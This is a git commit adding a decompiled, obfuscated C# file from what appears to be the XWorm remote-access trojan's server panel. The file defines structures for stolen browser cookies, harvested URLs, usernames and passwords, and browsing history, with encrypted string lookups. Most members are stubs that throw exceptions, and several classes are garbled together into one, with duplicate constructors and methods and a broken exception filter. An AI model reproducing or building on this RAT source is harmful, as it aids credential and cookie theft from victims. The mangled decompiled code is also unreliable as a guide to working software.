07e8c75b300fe5bb6a3f1ab0d9558d55cf51bdc8
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:50:49 +0400

    Forms36.cs

---
+++ XWorm V5.6/Server/Forms/Forms36.cs
@@ -0,0 +1,246 @@
+﻿using FF2D6F102A260C25FF3FD3711F3F0BB9;
+using IF7ECB736801D875D48E6C65CE1BIEF6;
+using M5E7485F8B1A1AD7481M48DMCMC4A3DC;
+using M95F4E5MF7905418B3E7M3BBMCM33E92;
+using MEA9MCF25F24475D52DDBEE8F296A691;
+using Microsoft.VisualBasic.CompilerServices;
+using N1C62C6F47393CBF2355AN5E34307DD0;
+using System;
+using System.Collections;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Windows.Forms;
+
+namespace IF0FF1FFB1CA752C08C9910B024F129F
+{
+  public class IA0AD4B699F26I4B2F7CFCF52I427780 : I2F88ED16A41I5FEI8E9B06BFCAF5E96
+  {
+    public static int L5L0E57B682E596DE791C87D12LD8DFF;
+    public static int LFFC1EA0E89365EF19B8LF93017L688A;
+    public static int A67344E1F4DED815D4AB0634E68817E6;
+    public static int L865L6686D42F618E27DA45F1F77FAAL;
+    public static int A33CD01B2775AFBD3EF8B75A9DBBF3DF;
+    public static int L7788F836D709B77D8L7A411B0ECC18A;
+    public static int L0DDA701B07DCC7FD6F0C3A2A7F6LCL1;
+    public static int HF2BHD5FD23ECD01HCB05HD848737D3E;
+    public static int H35CBE6CF4E4571H2DA14257H1D0D0H4;
+    public static int HA0712202C1A339AD32749EC5HE21933;
+    public static int HD2D518222B17485C726969B2CF35EC7;
+
+    public string domain
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ぬ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("ぶ");
+    }
+
+    public double expirationDate
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ゅ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("し");
+    }
+
+    public bool hostOnly
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("あ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("ま");
+    }
+
+    public bool httpOnly
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("や");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("ぁ");
+    }
+
+    public string name
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("さ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("ぴ");
+    }
+
+    public string path
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("け");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("る");
+    }
+
+    public string sameSite
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("そ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("や");
+    }
+
+    public bool secure
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ふ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("け");
+    }
+
+    public bool session
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ぉ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("び");
+    }
+
+    public string storeId
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ん");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("㍐");
+    }
+
+    public string value
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ゔ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("げ");
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public IA0AD4B699F26I4B2F7CFCF52I427780() => throw new Exception("ヸ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public string get_sUrl() => throw new Exception("ぬ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_sUrl(string AutoPropertyValue) => throw new Exception("ぶ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public string get_sUsername() => throw new Exception("ぽ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_sUsername(string AutoPropertyValue) => throw new Exception("す");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public string get_sPassword() => throw new Exception("ゕ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_sPassword(string AutoPropertyValue) => throw new Exception("か");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public string get_Target() => throw new Exception("ょ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_Target(string AutoPropertyValue) => throw new Exception("ゐ");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public IA0AD4B699F26I4B2F7CFCF52I427780() => throw new Exception("く");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public string get_sUrl() => throw new Exception("き");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_sUrl(string AutoPropertyValue) => throw new Exception("げ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public string get_sTitle() => throw new Exception("さ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_sTitle(string AutoPropertyValue) => throw new Exception("ち");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public int get_iCount() => throw new Exception("だ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_iCount(int AutoPropertyValue) => throw new Exception("へ");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public IA0AD4B699F26I4B2F7CFCF52I427780() => throw new Exception("ぁ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public string get_type() => throw new Exception("の");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_type(string AutoPropertyValue) => throw new Exception("び");
+
+    static IA0AD4B699F26I4B2F7CFCF52I427780()
+    {
+      FAFCD0C18FFE8F29EF883C1B32FB3915.I35F7CI9774CD0CD986BC3310CIB5FC0 = B2673BC82C5B1B0F6BAC43DC322CA48B.WL.LFBEE5D4C59E4EEAA400EB62CE4E2934("=Yvnslll?", (object) null);
+      // ISSUE: reference to a compiler-generated field
+      FAFCD0C18FFE8F29EF883C1B32FB3915.I4I69II1A8FD32DI6D246040F06EI9DI = D0390509B52C44661FC1BBD32C057C4B._Closure\u0024__R5\u002D7.A8CFB538AF416A13C18719A5A6947DDB != 0;
+      FAFCD0C18FFE8F29EF883C1B32FB3915.I430AB9DA9340FD39DD053479IA9795E = new List<FE2B86A9D832C0656F97BF8FC7D65AE7>();
+      FAFCD0C18FFE8F29EF883C1B32FB3915.I8CEAE3842C9E6B06IB7DII9BD0CAB13 = B2673BC82C5B1B0F6BAC43DC322CA48B.WL.LFBEE5D4C59E4EEAA400EB62CE4E2934("IJDX^BTSSDOU^TRDS]RNGUV@SD]YVnsl", (object) null);
+      FAFCD0C18FFE8F29EF883C1B32FB3915.ID31AC06FCF14F0220A9BA55A01E42B2 = RuntimeHelpers.GetObjectValue(new object());
+      FAFCD0C18FFE8F29EF883C1B32FB3915.ICBB19AF2I1429335BD5C0BEB57AF09F = 0L;
+      FAFCD0C18FFE8F29EF883C1B32FB3915.I945366DC8I8DE85D93605428B16A4EI = 0L;
+      FAFCD0C18FFE8F29EF883C1B32FB3915.I100C69D5I0190B177618E6E80I57608 = 0;
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public IA0AD4B699F26I4B2F7CFCF52I427780() => throw new Exception("む");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    internal static uint IF8868B3CI3CFEC4C7DIE44B89CEI298(string s) => throw new Exception("ぉ");
+
+    [DebuggerHidden]
+    private static T Create__Instance__<T>(T Instance) where T : Form, new()
+    {
+      if (!((object) Instance == null ? F37068503FD78A2484752A672949A328.L3EFL75BCLEFD58L11LFC1463C1L6850 != 0 : Instance.IsDisposed))
+        return Instance;
+      if (FAFCD0C18FFE8F29EF883C1B32FB3915.m_FormBeingCreated != null)
+      {
+        if (FAFCD0C18FFE8F29EF883C1B32FB3915.m_FormBeingCreated.ContainsKey((object) typeof (T)))
+          throw new InvalidOperationException(Utils.GetResourceString("WinForms_RecursiveFormCreate"));
+      }
+      else
+        FAFCD0C18FFE8F29EF883C1B32FB3915.m_FormBeingCreated = new Hashtable();
+      FAFCD0C18FFE8F29EF883C1B32FB3915.m_FormBeingCreated.Add((object) typeof (T), (object) null);
+      TargetInvocationException invocationException;
+      try
+      {
+        return new T();
+      }
+      catch (TargetInvocationException ex) when (
+      {
+        // ISSUE: unable to correctly present filter
+        ProjectData.SetProjectError((Exception) ex);
+        invocationException = ex;
+        if (invocationException.InnerException != null)
+        {
+          SuccessfulFiltering;
+        }
+        else
+          throw;
+      }
+      )
+      {
+        throw new InvalidOperationException(Utils.GetResourceString("WinForms_SeeInnerException", invocationException.InnerException.Message), invocationException.InnerException);
+      }
+      finally
+      {
+        FAFCD0C18FFE8F29EF883C1B32FB3915.m_FormBeingCreated.Remove((object) typeof (T));
+      }
+    }
+  }
+}
